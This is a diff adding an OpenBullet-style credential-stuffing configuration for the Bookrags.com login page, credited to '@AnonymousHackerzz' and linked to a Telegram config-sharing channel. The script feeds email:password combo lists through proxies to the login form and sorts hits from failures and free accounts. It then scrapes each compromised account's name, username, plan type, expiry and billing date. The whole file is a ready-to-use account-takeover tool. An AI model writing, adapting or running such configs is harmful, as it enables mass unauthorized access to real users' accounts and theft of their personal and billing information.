@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "Bookrags.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-08T08:43:51.7818146+00:00",
+  "AdditionalInfo": "Join us T.me/Turkconfigcenter",
+  "Author": "@AnonymousHackerzz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.bookrags.com/qa/login.php?step=submit&finishpg=http%3A%2F%2Fwww.bookrags.com%2Fbrowse%2Fstudyguides%2FA%2F%3Fpage%3D1&cancelpg=http%3A%2F%2Fwww.bookrags.com%2Fbrowse%2Fstudyguides%2FA%2F%3Fpage%3D1" 
+  CONTENT "edEmailOrName=<USER>&edPW=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 57" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.bookrags.com" 
+  HEADER "referer: https://www.bookrags.com/qa/login.php?finishpg=http%3A%2F%2Fwww.bookrags.com%2Fbrowse%2Fstudyguides%2FA%2F%3Fpage%3D1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+    KEY "Sign Out" 
+    KEY "<SOURCE>" EqualTo "Active" 
+  KEYCHAIN Failure OR 
+    KEY "Couldn't log in: The name or password is wrong. Try again." 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You do not have a subscription to BookRags." 
+
+#GET_LOG REQUEST GET "https://www.bookrags.com/my-account/" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: http://www.bookrags.com/" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66" 
+
+#Profile PARSE "<SOURCE>" LR "<span class=\"editor-read\" data-form-field=\"profile\">" "</span>" CreateEmpty=FALSE -> CAP "Profile" 
+
+#Username PARSE "<SOURCE>" LR "<span class=\"editor-read\" data-form-field=\"username\">" "</span>" CreateEmpty=FALSE -> CAP "Username" 
+
+#Name PARSE "<SOURCE>" LR "<span class=\"editor-read\" data-form-field=\"name\">" "</span>" CreateEmpty=FALSE -> CAP "Name" 
+
+#Plan PARSE "<SOURCE>" LR "w=72\\\" alt=\\\"\" \"\\\" title=\\\"\\\" style=\\\"margin-bottom" "" CreateEmpty=FALSE -> CAP "Plan Type" 
+
+#Teacher PARSE "<SOURCE>" LR "<span class=\"editor-read\" data-form-field=\"teacher\">" "</span>" CreateEmpty=FALSE -> CAP "Is Teacher" 
+
+#Status PARSE "<SOURCE>" LR "<td class=\"order-status\">" "</td>" CreateEmpty=FALSE -> CAP "Status" 
+
+#Expiry PARSE "<SOURCE>" LR "<td><strong>" "</strong>" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Last_billed PARSE "<SOURCE>" LR "<th>Last Billed:</th></td>" "</td>" CreateEmpty=FALSE -> CAP "Last Billed" 
+
+#FULL_CREDIT FUNCTION Constant "@AnonymousHackerzz ✘" -> CAP "✘ Config Developed By" 
+
